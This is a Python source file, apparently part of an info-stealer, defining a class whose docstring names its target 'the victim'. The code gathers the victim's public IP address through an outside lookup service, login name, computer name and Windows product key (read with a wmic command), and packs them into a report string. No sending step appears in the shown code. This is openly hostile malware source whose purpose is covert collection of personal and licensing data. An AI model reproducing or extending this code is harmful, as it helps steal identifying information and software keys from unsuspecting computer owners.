import os
import requests

class User(object):
	"""
	Simply returns the userdata of the victim and returns it.
	"""
	def __init__(self):
		self.userdata = ""
		self.get_userdata()

	def get_userdata(self):
		"""
		Gets the:
			- IP
			- Username
			- Computername
			- Windows Activation Key
		"""
		try:
			ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
			user = os.getlogin()
			cname = os.getenv('COMPUTERNAME')
			wkey = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
			self.userdata = "==== %s ====\nIP: %s\nUSERNAME: %s\nCOMPUTERNAME: %s\nWINDOWSKEY: %s" % (user, ip, user, cname, wkey)
		except:
			pass